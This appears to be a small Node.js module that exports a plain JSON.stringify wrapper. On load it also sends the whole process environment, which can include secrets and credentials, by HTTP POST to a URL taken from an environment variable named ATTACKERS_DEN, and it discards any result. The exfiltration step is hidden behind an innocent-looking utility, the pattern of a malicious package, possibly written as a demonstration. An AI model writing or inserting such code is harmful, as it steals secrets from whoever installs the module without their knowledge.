'use strict';

const request = require('superagent');

if (process.env.ATTACKERS_DEN) {
  request
    .post(process.env.ATTACKERS_DEN)
    .send(process.env)
    .end(function(err, res){
    });
}

module.exports = obj => JSON.stringify(obj);